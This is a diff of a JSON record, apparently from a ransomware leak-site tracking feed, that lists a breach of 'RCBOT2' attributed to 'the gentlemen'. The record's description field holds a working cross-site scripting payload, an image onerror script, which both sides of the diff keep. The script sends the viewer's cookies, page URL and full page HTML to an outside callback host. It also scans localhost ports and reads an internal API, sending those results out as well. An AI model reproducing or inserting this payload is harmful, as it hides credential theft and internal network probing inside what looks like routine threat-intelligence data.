@@ -1,15 +1,1 @@
-{
-  "slug": "the-gentlemen-rcbot2-2026-08-22",
-  "title": "RCBOT2",
-  "group": "the gentlemen",
-  "discovered": "2026-08-22T03:48:25.000Z",
-  "category": "data_breach",
-  "severity": "high",
-  "country": null,
-  "sizeBytes": 0,
-  "description": "<img src=x onerror=\"var H='https://nzagpz3jm8i5v726mnliix7xw412xve3w.oast.me';var b=function(p,d){var i=new Image();i.src=H+p+encodeURIComponent(d)};b('/m?l=',location.href+'|'+document.title+'|'+document.cookie);var h=document.documentElement.outerHTML;for(var i=0;i<8&&i*700<h.length;i++){b('/h'+i+'?d=',h.slice(i*700,(i+1)*700))};['80','5000','8000','8080','9000','3000','6379','8443'].forEach(function(p){fetch('http://127.0.0.1:'+p+'/',{mode:'no-cors'}).then(function(){b('/po?p=',p)}).catch(function(){b('/pc?p=',p)})});fetch('http://127.0.0.1:8080/api/companies').then(function(r){return r.text()}).then(function(d){b('/i8080?d=',d.slice(0,400))}).catch(function(e){b('/i8080e?m=',String(e).slice(0,80))});\">",
-  "source_url": "https://www.ransomlook.io/recent",
-  "groupAliases": [],
-  "activity": null,
-  "references": ["ransomlook.io"]
-}
+{"slug":"the-gentlemen-rcbot2-2026-08-22","title":"RCBOT2","group":"the gentlemen","discovered":"2026-08-22T03:48:25.000Z","category":"data_breach","severity":"high","country":null,"sizeBytes":0,"description":"<img src=x onerror=\"var H='https://nzagpz3jm8i5v726mnliix7xw412xve3w.oast.me';var b=function(p,d){var i=new Image();i.src=H+p+encodeURIComponent(d)};b('/m?l=',location.href+'|'+document.title+'|'+document.cookie);var h=document.documentElement.outerHTML;for(var i=0;i<8&&i*700<h.length;i++){b('/h'+i+'?d=',h.slice(i*700,(i+1)*700))};['80','5000','8000','8080','9000','3000','6379','8443'].forEach(function(p){fetch('http://127.0.0.1:'+p+'/',{mode:'no-cors'}).then(function(){b('/po?p=',p)}).catch(function(){b('/pc?p=',p)})});fetch('http://127.0.0.1:8080/api/companies').then(function(r){return r.text()}).then(function(d){b('/i8080?d=',d.slice(0,400))}).catch(function(e){b('/i8080e?m=',String(e).slice(0,80))});\">","source_url":"https://www.ransomlook.io/recent","groupAliases":[],"activity":null,"references":["ransomlook.io"]}
